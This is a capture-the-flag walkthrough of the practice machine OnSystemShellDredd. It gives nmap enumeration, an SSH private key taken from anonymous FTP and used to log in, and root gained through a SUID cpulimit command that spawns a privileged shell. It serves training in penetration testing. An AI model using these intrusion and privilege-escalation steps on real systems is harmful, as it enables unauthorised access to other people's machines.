# PG Play - OnSystemShellDredd

#### Ip: 192.168.235.130
#### Name: OnSystemShellDredd
#### Difficulty: Easy
#### Community Rating: Easy

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `-sC` and `-sV` flags to use basic scripts and to enumerate versions.

```text
┌──(ryan㉿kali)-[~/PG/OnSystemShellDredd]
└─$ sudo nmap -p-  --min-rate 10000 192.168.235.130 -sC -sV
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 15:07 CDT
Nmap scan report for 192.168.235.130
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.177
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 592d210c2faf9d5a7b3ea427aa378908 (RSA)
|   256 5926da443b97d230b19b9b02748b8758 (ECDSA)
|_  256 8ead104fe33e652840cb5bbf1d247f17 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds
```

Interesting, only FTP and SSH are open on TCP ports. 

Looking at the scan results we see that FTP has anonymous access enabled. Lets start there.

```text
┌──(ryan㉿kali)-[~/PG/OnSystemShellDredd]
└─$ ftp 192.168.235.130
Connected to 192.168.235.130.
220 (vsFTPd 3.0.3)
Name (192.168.235.130:ryan): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48916|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||54981|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||56908|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||45575|)
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |********************************************************************************|  1823        6.58 MiB/s    00:00 ETA
226 Transfer complete.
1823 bytes received in 00:00 (26.05 KiB/s)
ftp> bye
221 Goodbye.
```

Wow, looks like we have an SSH key for user hannah.

### Exploitation

Nice, we were able to use this key to get on the target:

```text
┌──(ryan㉿kali)-[~/PG/OnSystemShellDredd]
└─$ chmod 600 id_rsa
                                                                                                                                                                                                                                                      
┌──(ryan㉿kali)-[~/PG/OnSystemShellDredd]
└─$ ssh -i id_rsa hannah@192.168.235.130 -p 61000
The authenticity of host '[192.168.235.130]:61000 ([192.168.235.130]:61000)' can't be established.
ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.235.130]:61000' (ED25519) to the list of known hosts.
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ hostname
ShellDredd
```

We can now grab the local.txt flag:

user_flag.png

### Privilege Escalation

Lets transfer over LinPEAS to help with enumerating a privilege escalation vector:

transfer.png

LinPeas finds a couple of programs with the SUID bit set we may be able to use to escalate privlieges:

suid.png

Lets head over to https://gtfobins.github.io/gtfobins/cpulimit/ to get the command we'll need to exploit this:

gtfo.png

We can exploit this by running:

```text
hannah@ShellDredd:/tmp$ cd /usr/bin
hannah@ShellDredd:/usr/bin$ ./cpulimit -l 100 -f -- /bin/sh -p
Process 13092 detected
# whoami
root
# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)
```

And can grab the proof.txt flag:

root_flag.png

Thanks for following along!

-Ryan

-----------------------------------------------